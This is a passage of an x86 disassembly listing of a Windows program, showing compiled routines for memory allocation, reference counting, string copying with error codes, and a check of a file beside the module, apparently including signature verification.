  401c36:	5d                   	pop    %ebp
  401c37:	c2 04 00             	ret    $0x4
  401c3a:	cc                   	int3
  401c3b:	cc                   	int3
  401c3c:	cc                   	int3
  401c3d:	cc                   	int3
  401c3e:	cc                   	int3
  401c3f:	cc                   	int3
  401c40:	55                   	push   %ebp
  401c41:	8b ec                	mov    %esp,%ebp
  401c43:	8b 55 08             	mov    0x8(%ebp),%edx
  401c46:	85 d2                	test   %edx,%edx
  401c48:	75 0b                	jne    0x401c55
  401c4a:	8b 01                	mov    (%ecx),%eax
  401c4c:	ff 75 0c             	push   0xc(%ebp)
  401c4f:	ff 10                	call   *(%eax)
  401c51:	5d                   	pop    %ebp
  401c52:	c2 08 00             	ret    $0x8
  401c55:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c58:	85 c0                	test   %eax,%eax
  401c5a:	75 0c                	jne    0x401c68
  401c5c:	8b 01                	mov    (%ecx),%eax
  401c5e:	52                   	push   %edx
  401c5f:	ff 50 04             	call   *0x4(%eax)
  401c62:	33 c0                	xor    %eax,%eax
  401c64:	5d                   	pop    %ebp
  401c65:	c2 08 00             	ret    $0x8
  401c68:	50                   	push   %eax
  401c69:	52                   	push   %edx
  401c6a:	6a 00                	push   $0x0
  401c6c:	ff 71 04             	push   0x4(%ecx)
  401c6f:	ff 15 60 10 42 00    	call   *0x421060
  401c75:	5d                   	pop    %ebp
  401c76:	c2 08 00             	ret    $0x8
  401c79:	cc                   	int3
  401c7a:	cc                   	int3
  401c7b:	cc                   	int3
  401c7c:	cc                   	int3
  401c7d:	cc                   	int3
  401c7e:	cc                   	int3
  401c7f:	cc                   	int3
  401c80:	55                   	push   %ebp
  401c81:	8b ec                	mov    %esp,%ebp
  401c83:	ff 75 08             	push   0x8(%ebp)
  401c86:	6a 00                	push   $0x0
  401c88:	ff 71 04             	push   0x4(%ecx)
  401c8b:	ff 15 64 10 42 00    	call   *0x421064
  401c91:	5d                   	pop    %ebp
  401c92:	c2 04 00             	ret    $0x4
  401c95:	cc                   	int3
  401c96:	cc                   	int3
  401c97:	cc                   	int3
  401c98:	cc                   	int3
  401c99:	cc                   	int3
  401c9a:	cc                   	int3
  401c9b:	cc                   	int3
  401c9c:	cc                   	int3
  401c9d:	cc                   	int3
  401c9e:	cc                   	int3
  401c9f:	cc                   	int3
  401ca0:	55                   	push   %ebp
  401ca1:	8b ec                	mov    %esp,%ebp
  401ca3:	56                   	push   %esi
  401ca4:	8b f1                	mov    %ecx,%esi
  401ca6:	80 7e 08 00          	cmpb   $0x0,0x8(%esi)
  401caa:	c7 06 0c 6d 42 00    	movl   $0x426d0c,(%esi)
  401cb0:	74 0e                	je     0x401cc0
  401cb2:	8b 46 04             	mov    0x4(%esi),%eax
  401cb5:	85 c0                	test   %eax,%eax
  401cb7:	74 07                	je     0x401cc0
  401cb9:	50                   	push   %eax
  401cba:	ff 15 54 10 42 00    	call   *0x421054
  401cc0:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  401cc4:	74 0b                	je     0x401cd1
  401cc6:	6a 0c                	push   $0xc
  401cc8:	56                   	push   %esi
  401cc9:	e8 3e a5 00 00       	call   0x40c20c
  401cce:	83 c4 08             	add    $0x8,%esp
  401cd1:	8b c6                	mov    %esi,%eax
  401cd3:	5e                   	pop    %esi
  401cd4:	5d                   	pop    %ebp
  401cd5:	c2 04 00             	ret    $0x4
  401cd8:	cc                   	int3
  401cd9:	cc                   	int3
  401cda:	cc                   	int3
  401cdb:	cc                   	int3
  401cdc:	cc                   	int3
  401cdd:	cc                   	int3
  401cde:	cc                   	int3
  401cdf:	cc                   	int3
  401ce0:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  401ce6:	56                   	push   %esi
  401ce7:	8b 30                	mov    (%eax),%esi
  401ce9:	a1 44 c9 42 00       	mov    0x42c944,%eax
  401cee:	3b 86 04 00 00 00    	cmp    0x4(%esi),%eax
  401cf4:	7e 5e                	jle    0x401d54
  401cf6:	68 44 c9 42 00       	push   $0x42c944
  401cfb:	e8 8d a9 00 00       	call   0x40c68d
  401d00:	83 c4 04             	add    $0x4,%esp
  401d03:	83 3d 44 c9 42 00 ff 	cmpl   $0xffffffff,0x42c944
  401d0a:	75 48                	jne    0x401d54
  401d0c:	0f 57 c0             	xorps  %xmm0,%xmm0
  401d0f:	c7 05 40 c9 42 00 00 	movl   $0x0,0x42c940
  401d16:	00 00 00 
  401d19:	66 0f d6 05 38 c9 42 	movq   %xmm0,0x42c938
  401d20:	00 
  401d21:	ff 15 6c 10 42 00    	call   *0x42106c
  401d27:	68 b0 0d 42 00       	push   $0x420db0
  401d2c:	c7 05 38 c9 42 00 0c 	movl   $0x426d0c,0x42c938
  401d33:	6d 42 00 
  401d36:	a3 3c c9 42 00       	mov    %eax,0x42c93c
  401d3b:	c6 05 40 c9 42 00 00 	movb   $0x0,0x42c940
  401d42:	e8 b0 a7 00 00       	call   0x40c4f7
  401d47:	68 44 c9 42 00       	push   $0x42c944
  401d4c:	e8 f2 a8 00 00       	call   0x40c643
  401d51:	83 c4 08             	add    $0x8,%esp
  401d54:	a1 34 c9 42 00       	mov    0x42c934,%eax
  401d59:	3b 86 04 00 00 00    	cmp    0x4(%esi),%eax
  401d5f:	5e                   	pop    %esi
  401d60:	7e 70                	jle    0x401dd2
  401d62:	68 34 c9 42 00       	push   $0x42c934
  401d67:	e8 21 a9 00 00       	call   0x40c68d
  401d6c:	83 c4 04             	add    $0x4,%esp
  401d6f:	83 3d 34 c9 42 00 ff 	cmpl   $0xffffffff,0x42c934
  401d76:	75 5a                	jne    0x401dd2
  401d78:	33 c0                	xor    %eax,%eax
  401d7a:	c7 05 18 c9 42 00 f0 	movl   $0x426cf0,0x42c918
  401d81:	6c 42 00 
  401d84:	68 a0 0d 42 00       	push   $0x420da0
  401d89:	c7 05 1c c9 42 00 38 	movl   $0x42c938,0x42c91c
  401d90:	c9 42 00 
  401d93:	c7 05 2c c9 42 00 02 	movl   $0x2,0x42c92c
  401d9a:	00 00 00 
  401d9d:	c7 05 24 c9 42 00 00 	movl   $0x0,0x42c924
  401da4:	00 00 00 
  401da7:	c7 05 28 c9 42 00 00 	movl   $0x0,0x42c928
  401dae:	00 00 00 
  401db1:	a3 30 c9 42 00       	mov    %eax,0x42c930
  401db6:	c7 05 20 c9 42 00 18 	movl   $0x42c918,0x42c920
  401dbd:	c9 42 00 
  401dc0:	e8 32 a7 00 00       	call   0x40c4f7
  401dc5:	68 34 c9 42 00       	push   $0x42c934
  401dca:	e8 74 a8 00 00       	call   0x40c643
  401dcf:	83 c4 08             	add    $0x8,%esp
  401dd2:	b8 18 c9 42 00       	mov    $0x42c918,%eax
  401dd7:	c3                   	ret
  401dd8:	cc                   	int3
  401dd9:	cc                   	int3
  401dda:	cc                   	int3
  401ddb:	cc                   	int3
  401ddc:	cc                   	int3
  401ddd:	cc                   	int3
  401dde:	cc                   	int3
  401ddf:	cc                   	int3
  401de0:	55                   	push   %ebp
  401de1:	8b ec                	mov    %esp,%ebp
  401de3:	8b 55 08             	mov    0x8(%ebp),%edx
  401de6:	56                   	push   %esi
  401de7:	57                   	push   %edi
  401de8:	8b f9                	mov    %ecx,%edi
  401dea:	85 d2                	test   %edx,%edx
  401dec:	78 57                	js     0x401e45
  401dee:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401df3:	2b c2                	sub    %edx,%eax
  401df5:	83 f8 01             	cmp    $0x1,%eax
  401df8:	7c 4b                	jl     0x401e45
  401dfa:	42                   	inc    %edx
  401dfb:	8d 72 07             	lea    0x7(%edx),%esi
  401dfe:	83 e6 f8             	and    $0xfffffff8,%esi
  401e01:	3b d6                	cmp    %esi,%edx
  401e03:	7f 40                	jg     0x401e45
  401e05:	8b c6                	mov    %esi,%eax
  401e07:	f7 65 0c             	mull   0xc(%ebp)
  401e0a:	85 d2                	test   %edx,%edx
  401e0c:	77 37                	ja     0x401e45
  401e0e:	72 05                	jb     0x401e15
  401e10:	83 f8 ff             	cmp    $0xffffffff,%eax
  401e13:	77 30                	ja     0x401e45
  401e15:	83 f8 ef             	cmp    $0xffffffef,%eax
  401e18:	77 2b                	ja     0x401e45
  401e1a:	8b 4f 04             	mov    0x4(%edi),%ecx
  401e1d:	8d 50 10             	lea    0x10(%eax),%edx
  401e20:	52                   	push   %edx
  401e21:	8b 01                	mov    (%ecx),%eax
  401e23:	ff 10                	call   *(%eax)
  401e25:	85 c0                	test   %eax,%eax
  401e27:	74 1c                	je     0x401e45
  401e29:	89 38                	mov    %edi,(%eax)
  401e2b:	8d 4e ff             	lea    -0x1(%esi),%ecx
  401e2e:	5f                   	pop    %edi
  401e2f:	c7 40 0c 01 00 00 00 	movl   $0x1,0xc(%eax)
  401e36:	89 48 08             	mov    %ecx,0x8(%eax)
  401e39:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  401e40:	5e                   	pop    %esi
  401e41:	5d                   	pop    %ebp
  401e42:	c2 08 00             	ret    $0x8
  401e45:	5f                   	pop    %edi
  401e46:	33 c0                	xor    %eax,%eax
  401e48:	5e                   	pop    %esi
  401e49:	5d                   	pop    %ebp
  401e4a:	c2 08 00             	ret    $0x8
  401e4d:	cc                   	int3
  401e4e:	cc                   	int3
  401e4f:	cc                   	int3
  401e50:	55                   	push   %ebp
  401e51:	8b ec                	mov    %esp,%ebp
  401e53:	8b 49 04             	mov    0x4(%ecx),%ecx
  401e56:	8b 01                	mov    (%ecx),%eax
  401e58:	5d                   	pop    %ebp
  401e59:	ff 60 04             	jmp    *0x4(%eax)
  401e5c:	cc                   	int3
  401e5d:	cc                   	int3
  401e5e:	cc                   	int3
  401e5f:	cc                   	int3
  401e60:	55                   	push   %ebp
  401e61:	8b ec                	mov    %esp,%ebp
  401e63:	8b 55 0c             	mov    0xc(%ebp),%edx
  401e66:	56                   	push   %esi
  401e67:	57                   	push   %edi
  401e68:	8b 7d 08             	mov    0x8(%ebp),%edi
  401e6b:	85 d2                	test   %edx,%edx
  401e6d:	78 49                	js     0x401eb8
  401e6f:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401e74:	2b c2                	sub    %edx,%eax
  401e76:	83 f8 01             	cmp    $0x1,%eax
  401e79:	7c 3d                	jl     0x401eb8
  401e7b:	42                   	inc    %edx
  401e7c:	8d 72 07             	lea    0x7(%edx),%esi
  401e7f:	83 e6 f8             	and    $0xfffffff8,%esi
  401e82:	3b d6                	cmp    %esi,%edx
  401e84:	7f 32                	jg     0x401eb8
  401e86:	8b c6                	mov    %esi,%eax
  401e88:	f7 65 10             	mull   0x10(%ebp)
  401e8b:	85 d2                	test   %edx,%edx
  401e8d:	77 29                	ja     0x401eb8
  401e8f:	72 05                	jb     0x401e96
  401e91:	83 f8 ff             	cmp    $0xffffffff,%eax
  401e94:	77 22                	ja     0x401eb8
  401e96:	83 f8 ef             	cmp    $0xffffffef,%eax
  401e99:	77 1d                	ja     0x401eb8
  401e9b:	8b 49 04             	mov    0x4(%ecx),%ecx
  401e9e:	83 c0 10             	add    $0x10,%eax
  401ea1:	50                   	push   %eax
  401ea2:	57                   	push   %edi
  401ea3:	8b 11                	mov    (%ecx),%edx
  401ea5:	ff 52 08             	call   *0x8(%edx)
  401ea8:	85 c0                	test   %eax,%eax
  401eaa:	74 0c                	je     0x401eb8
  401eac:	8d 4e ff             	lea    -0x1(%esi),%ecx
  401eaf:	5f                   	pop    %edi
  401eb0:	89 48 08             	mov    %ecx,0x8(%eax)
  401eb3:	5e                   	pop    %esi
  401eb4:	5d                   	pop    %ebp
  401eb5:	c2 0c 00             	ret    $0xc
  401eb8:	5f                   	pop    %edi
  401eb9:	33 c0                	xor    %eax,%eax
  401ebb:	5e                   	pop    %esi
  401ebc:	5d                   	pop    %ebp
  401ebd:	c2 0c 00             	ret    $0xc
  401ec0:	f0 ff 41 14          	lock incl 0x14(%ecx)
  401ec4:	8d 41 08             	lea    0x8(%ecx),%eax
  401ec7:	c3                   	ret
  401ec8:	cc                   	int3
  401ec9:	cc                   	int3
  401eca:	cc                   	int3
  401ecb:	cc                   	int3
  401ecc:	cc                   	int3
  401ecd:	cc                   	int3
  401ece:	cc                   	int3
  401ecf:	cc                   	int3
  401ed0:	8b c1                	mov    %ecx,%eax
  401ed2:	c3                   	ret
  401ed3:	cc                   	int3
  401ed4:	cc                   	int3
  401ed5:	cc                   	int3
  401ed6:	cc                   	int3
  401ed7:	cc                   	int3
  401ed8:	cc                   	int3
  401ed9:	cc                   	int3
  401eda:	cc                   	int3
  401edb:	cc                   	int3
  401edc:	cc                   	int3
  401edd:	cc                   	int3
  401ede:	cc                   	int3
  401edf:	cc                   	int3
  401ee0:	55                   	push   %ebp
  401ee1:	8b ec                	mov    %esp,%ebp
  401ee3:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  401ee7:	56                   	push   %esi
  401ee8:	8b f1                	mov    %ecx,%esi
  401eea:	74 0b                	je     0x401ef7
  401eec:	6a 1c                	push   $0x1c
  401eee:	56                   	push   %esi
  401eef:	e8 18 a3 00 00       	call   0x40c20c
  401ef4:	83 c4 08             	add    $0x8,%esp
  401ef7:	8b c6                	mov    %esi,%eax
  401ef9:	5e                   	pop    %esi
  401efa:	5d                   	pop    %ebp
  401efb:	c2 04 00             	ret    $0x4
  401efe:	cc                   	int3
  401eff:	cc                   	int3
  401f00:	55                   	push   %ebp
  401f01:	8b ec                	mov    %esp,%ebp
  401f03:	6a ff                	push   $0xffffffff
  401f05:	68 2f 04 42 00       	push   $0x42042f
  401f0a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401f10:	50                   	push   %eax
  401f11:	83 ec 20             	sub    $0x20,%esp
  401f14:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  401f19:	33 c5                	xor    %ebp,%eax
  401f1b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401f1e:	53                   	push   %ebx
  401f1f:	56                   	push   %esi
  401f20:	57                   	push   %edi
  401f21:	50                   	push   %eax
  401f22:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401f25:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401f2b:	8b fa                	mov    %edx,%edi
  401f2d:	8b f1                	mov    %ecx,%esi
  401f2f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401f32:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401f35:	50                   	push   %eax
  401f36:	ff 15 e4 11 42 00    	call   *0x4211e4
  401f3c:	8b 06                	mov    (%esi),%eax
  401f3e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401f41:	6a 00                	push   $0x0
  401f43:	6a 00                	push   $0x0
  401f45:	51                   	push   %ecx
  401f46:	6a 00                	push   $0x0
  401f48:	57                   	push   %edi
  401f49:	56                   	push   %esi
  401f4a:	ff 50 10             	call   *0x10(%eax)
  401f4d:	8b f0                	mov    %eax,%esi
  401f4f:	89 75 d8             	mov    %esi,-0x28(%ebp)
  401f52:	85 f6                	test   %esi,%esi
  401f54:	79 0f                	jns    0x401f65
  401f56:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401f59:	50                   	push   %eax
  401f5a:	ff 15 e8 11 42 00    	call   *0x4211e8
  401f60:	e9 d0 00 00 00       	jmp    0x402035
  401f65:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  401f68:	85 ff                	test   %edi,%edi
  401f6a:	74 0e                	je     0x401f7a
  401f6c:	8b 03                	mov    (%ebx),%eax
  401f6e:	85 c0                	test   %eax,%eax
  401f70:	74 58                	je     0x401fca
  401f72:	39 38                	cmp    %edi,(%eax)
  401f74:	0f 84 bb 00 00 00    	je     0x402035
  401f7a:	8b 33                	mov    (%ebx),%esi
  401f7c:	85 f6                	test   %esi,%esi
  401f7e:	74 4a                	je     0x401fca
  401f80:	83 c8 ff             	or     $0xffffffff,%eax
  401f83:	f0 0f c1 46 08       	lock xadd %eax,0x8(%esi)
  401f88:	48                   	dec    %eax
  401f89:	75 39                	jne    0x401fc4
  401f8b:	85 f6                	test   %esi,%esi
  401f8d:	74 35                	je     0x401fc4
  401f8f:	8b 06                	mov    (%esi),%eax
  401f91:	85 c0                	test   %eax,%eax
  401f93:	74 0d                	je     0x401fa2
  401f95:	50                   	push   %eax
  401f96:	ff 15 e0 11 42 00    	call   *0x4211e0
  401f9c:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  401fa2:	8b 46 04             	mov    0x4(%esi),%eax
  401fa5:	85 c0                	test   %eax,%eax
  401fa7:	74 10                	je     0x401fb9
  401fa9:	50                   	push   %eax
  401faa:	e8 5d a5 00 00       	call   0x40c50c
  401faf:	83 c4 04             	add    $0x4,%esp
  401fb2:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  401fb9:	6a 0c                	push   $0xc
  401fbb:	56                   	push   %esi
  401fbc:	e8 4b a2 00 00       	call   0x40c20c
  401fc1:	83 c4 08             	add    $0x8,%esp
  401fc4:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  401fca:	6a 0c                	push   $0xc
  401fcc:	e8 49 a2 00 00       	call   0x40c21a
  401fd1:	8b f0                	mov    %eax,%esi
  401fd3:	83 c4 04             	add    $0x4,%esp
  401fd6:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  401fd9:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401fe0:	85 f6                	test   %esi,%esi
  401fe2:	74 3f                	je     0x402023
  401fe4:	0f 57 c0             	xorps  %xmm0,%xmm0
  401fe7:	66 0f d6 06          	movq   %xmm0,(%esi)
  401feb:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  401ff2:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  401ff9:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  402000:	85 ff                	test   %edi,%edi
  402002:	74 17                	je     0x40201b
  402004:	57                   	push   %edi
  402005:	ff 15 dc 11 42 00    	call   *0x4211dc
  40200b:	50                   	push   %eax
  40200c:	57                   	push   %edi
  40200d:	ff 15 d8 11 42 00    	call   *0x4211d8
  402013:	89 06                	mov    %eax,(%esi)
  402015:	85 c0                	test   %eax,%eax
  402017:	74 3a                	je     0x402053
  402019:	eb 0a                	jmp    0x402025
  40201b:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  402021:	eb 02                	jmp    0x402025
  402023:	33 f6                	xor    %esi,%esi
  402025:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40202c:	89 33                	mov    %esi,(%ebx)
  40202e:	85 f6                	test   %esi,%esi
  402030:	74 2b                	je     0x40205d
  402032:	8b 75 d8             	mov    -0x28(%ebp),%esi
  402035:	8b c6                	mov    %esi,%eax
  402037:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40203a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402041:	59                   	pop    %ecx
  402042:	5f                   	pop    %edi
  402043:	5e                   	pop    %esi
  402044:	5b                   	pop    %ebx
  402045:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402048:	33 cd                	xor    %ebp,%ecx
  40204a:	e8 ac a1 00 00       	call   0x40c1fb
  40204f:	8b e5                	mov    %ebp,%esp
  402051:	5d                   	pop    %ebp
  402052:	c3                   	ret
  402053:	68 0e 00 07 80       	push   $0x8007000e
  402058:	e8 d3 b4 00 00       	call   0x40d530
  40205d:	68 0e 00 07 80       	push   $0x8007000e
  402062:	e8 c9 b4 00 00       	call   0x40d530
  402067:	cc                   	int3
  402068:	cc                   	int3
  402069:	cc                   	int3
  40206a:	cc                   	int3
  40206b:	cc                   	int3
  40206c:	cc                   	int3
  40206d:	cc                   	int3
  40206e:	cc                   	int3
  40206f:	cc                   	int3
  402070:	55                   	push   %ebp
  402071:	8b ec                	mov    %esp,%ebp
  402073:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402076:	33 c0                	xor    %eax,%eax
  402078:	57                   	push   %edi
  402079:	8b 7d 08             	mov    0x8(%ebp),%edi
  40207c:	85 c9                	test   %ecx,%ecx
  40207e:	74 08                	je     0x402088
  402080:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  402086:	76 05                	jbe    0x40208d
  402088:	b8 57 00 07 80       	mov    $0x80070057,%eax
  40208d:	85 c0                	test   %eax,%eax
  40208f:	78 58                	js     0x4020e9
  402091:	53                   	push   %ebx
  402092:	56                   	push   %esi
  402093:	8d 45 14             	lea    0x14(%ebp),%eax
  402096:	33 db                	xor    %ebx,%ebx
  402098:	50                   	push   %eax
  402099:	53                   	push   %ebx
  40209a:	ff 75 10             	push   0x10(%ebp)
  40209d:	8d 71 ff             	lea    -0x1(%ecx),%esi
  4020a0:	56                   	push   %esi
  4020a1:	57                   	push   %edi
  4020a2:	e8 49 13 00 00       	call   0x4033f0
  4020a7:	8b 08                	mov    (%eax),%ecx
  4020a9:	ff 70 04             	push   0x4(%eax)
  4020ac:	83 c9 01             	or     $0x1,%ecx
  4020af:	51                   	push   %ecx
  4020b0:	e8 b7 f8 00 00       	call   0x41196c
  4020b5:	83 c9 ff             	or     $0xffffffff,%ecx
  4020b8:	83 c4 1c             	add    $0x1c,%esp
  4020bb:	85 c0                	test   %eax,%eax
  4020bd:	0f 48 c1             	cmovs  %ecx,%eax
  4020c0:	85 c0                	test   %eax,%eax
  4020c2:	78 13                	js     0x4020d7
  4020c4:	3b c6                	cmp    %esi,%eax
  4020c6:	77 0f                	ja     0x4020d7
  4020c8:	75 18                	jne    0x4020e2
  4020ca:	33 c0                	xor    %eax,%eax
  4020cc:	66 89 04 77          	mov    %ax,(%edi,%esi,2)
  4020d0:	8b c3                	mov    %ebx,%eax
  4020d2:	5e                   	pop    %esi
  4020d3:	5b                   	pop    %ebx
  4020d4:	5f                   	pop    %edi
  4020d5:	5d                   	pop    %ebp
  4020d6:	c3                   	ret
  4020d7:	33 c0                	xor    %eax,%eax
  4020d9:	bb 7a 00 07 80       	mov    $0x8007007a,%ebx
  4020de:	66 89 04 77          	mov    %ax,(%edi,%esi,2)
  4020e2:	5e                   	pop    %esi
  4020e3:	8b c3                	mov    %ebx,%eax
  4020e5:	5b                   	pop    %ebx
  4020e6:	5f                   	pop    %edi
  4020e7:	5d                   	pop    %ebp
  4020e8:	c3                   	ret
  4020e9:	85 c9                	test   %ecx,%ecx
  4020eb:	74 05                	je     0x4020f2
  4020ed:	33 c9                	xor    %ecx,%ecx
  4020ef:	66 89 0f             	mov    %cx,(%edi)
  4020f2:	5f                   	pop    %edi
  4020f3:	5d                   	pop    %ebp
  4020f4:	c3                   	ret
  4020f5:	cc                   	int3
  4020f6:	cc                   	int3
  4020f7:	cc                   	int3
  4020f8:	cc                   	int3
  4020f9:	cc                   	int3
  4020fa:	cc                   	int3
  4020fb:	cc                   	int3
  4020fc:	cc                   	int3
  4020fd:	cc                   	int3
  4020fe:	cc                   	int3
  4020ff:	cc                   	int3
  402100:	55                   	push   %ebp
  402101:	8b ec                	mov    %esp,%ebp
  402103:	56                   	push   %esi
  402104:	8b f2                	mov    %edx,%esi
  402106:	85 f6                	test   %esi,%esi
  402108:	74 25                	je     0x40212f
  40210a:	57                   	push   %edi
  40210b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40210e:	b8 fe ff ff 7f       	mov    $0x7ffffffe,%eax
  402113:	2b f9                	sub    %ecx,%edi
  402115:	85 c0                	test   %eax,%eax
  402117:	74 15                	je     0x40212e
  402119:	0f b7 14 0f          	movzwl (%edi,%ecx,1),%edx
  40211d:	66 85 d2             	test   %dx,%dx
  402120:	74 0c                	je     0x40212e
  402122:	66 89 11             	mov    %dx,(%ecx)
  402125:	48                   	dec    %eax
  402126:	83 c1 02             	add    $0x2,%ecx
  402129:	83 ee 01             	sub    $0x1,%esi
  40212c:	75 e7                	jne    0x402115
  40212e:	5f                   	pop    %edi
  40212f:	33 d2                	xor    %edx,%edx
  402131:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
  402136:	85 f6                	test   %esi,%esi
  402138:	5e                   	pop    %esi
  402139:	0f 45 c2             	cmovne %edx,%eax
  40213c:	8d 51 fe             	lea    -0x2(%ecx),%edx
  40213f:	0f 45 d1             	cmovne %ecx,%edx
  402142:	33 c9                	xor    %ecx,%ecx
  402144:	66 89 0a             	mov    %cx,(%edx)
  402147:	5d                   	pop    %ebp
  402148:	c2 0c 00             	ret    $0xc
  40214b:	cc                   	int3
  40214c:	cc                   	int3
  40214d:	cc                   	int3
  40214e:	cc                   	int3
  40214f:	cc                   	int3
  402150:	55                   	push   %ebp
  402151:	8b ec                	mov    %esp,%ebp
  402153:	83 e4 f8             	and    $0xfffffff8,%esp
  402156:	83 ec 58             	sub    $0x58,%esp
  402159:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  40215e:	33 c4                	xor    %esp,%eax
  402160:	89 44 24 54          	mov    %eax,0x54(%esp)
  402164:	8d 44 24 04          	lea    0x4(%esp),%eax
  402168:	c7 44 24 04 10 00 00 	movl   $0x10,0x4(%esp)
  40216f:	00 
  402170:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402174:	8d 44 24 14          	lea    0x14(%esp),%eax
  402178:	50                   	push   %eax
  402179:	8d 44 24 48          	lea    0x48(%esp),%eax
  40217d:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  402181:	50                   	push   %eax
  402182:	6a ff                	push   $0xffffffff
  402184:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  40218b:	00 
  40218c:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402193:	00 
  402194:	c7 44 24 20 30 00 00 	movl   $0x30,0x20(%esp)
  40219b:	00 
  40219c:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4021a3:	00 
  4021a4:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  4021ab:	00 
  4021ac:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  4021b0:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  4021b7:	00 
  4021b8:	c7 44 24 34 01 00 00 	movl   $0x1,0x34(%esp)
  4021bf:	00 
  4021c0:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  4021c7:	00 
  4021c8:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%esp)
  4021cf:	00 
  4021d0:	c7 44 24 44 00 00 00 	movl   $0x0,0x44(%esp)
  4021d7:	00 
  4021d8:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  4021df:	00 
  4021e0:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%esp)
  4021e7:	00 
  4021e8:	c7 44 24 50 6b c5 aa 	movl   $0xaac56b,0x50(%esp)
  4021ef:	00 
  4021f0:	c7 44 24 54 44 cd d0 	movl   $0x11d0cd44,0x54(%esp)
  4021f7:	11 
  4021f8:	c7 44 24 58 8c c2 00 	movl   $0xc000c28c,0x58(%esp)
  4021ff:	c0 
  402200:	c7 44 24 5c 4f c2 95 	movl   $0xee95c24f,0x5c(%esp)
  402207:	ee 
  402208:	ff 15 9c 12 42 00    	call   *0x42129c
  40220e:	8b 4c 24 54          	mov    0x54(%esp),%ecx
  402212:	33 cc                	xor    %esp,%ecx
  402214:	e8 e2 9f 00 00       	call   0x40c1fb
  402219:	8b e5                	mov    %ebp,%esp
  40221b:	5d                   	pop    %ebp
  40221c:	c3                   	ret
  40221d:	cc                   	int3
  40221e:	cc                   	int3
  40221f:	cc                   	int3
  402220:	55                   	push   %ebp
  402221:	8b ec                	mov    %esp,%ebp
  402223:	81 ec 14 02 00 00    	sub    $0x214,%esp
  402229:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  40222e:	33 c5                	xor    %ebp,%eax
  402230:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402233:	53                   	push   %ebx
  402234:	56                   	push   %esi
  402235:	68 04 01 00 00       	push   $0x104
  40223a:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402240:	8a da                	mov    %dl,%bl
  402242:	50                   	push   %eax
  402243:	6a 00                	push   $0x0
  402245:	8b f1                	mov    %ecx,%esi
  402247:	ff 15 80 10 42 00    	call   *0x421080
  40224d:	85 c0                	test   %eax,%eax
  40224f:	0f 84 8e 00 00 00    	je     0x4022e3
  402255:	3d 04 01 00 00       	cmp    $0x104,%eax
  40225a:	0f 84 83 00 00 00    	je     0x4022e3
  402260:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402266:	50                   	push   %eax
  402267:	ff 15 14 12 42 00    	call   *0x421214
  40226d:	68 20 6d 42 00       	push   $0x426d20
  402272:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402278:	50                   	push   %eax
  402279:	ff 15 18 12 42 00    	call   *0x421218
  40227f:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402285:	50                   	push   %eax
  402286:	ff 15 84 10 42 00    	call   *0x421084
  40228c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40228f:	74 4a                	je     0x4022db
  402291:	a8 10                	test   $0x10,%al
  402293:	75 46                	jne    0x4022db
  402295:	84 db                	test   %bl,%bl
  402297:	74 1d                	je     0x4022b6
  402299:	0f b6 55 08          	movzbl 0x8(%ebp),%edx
  40229d:	8d 8d ec fd ff ff    	lea    -0x214(%ebp),%ecx
  4022a3:	83 f2 01             	xor    $0x1,%edx
  4022a6:	8d 14 55 02 00 00 00 	lea    0x2(,%edx,2),%edx
  4022ad:	e8 9e fe ff ff       	call   0x402150
  4022b2:	85 c0                	test   %eax,%eax
  4022b4:	75 2d                	jne    0x4022e3
  4022b6:	6a 02                	push   $0x2
  4022b8:	6a 00                	push   $0x0
  4022ba:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
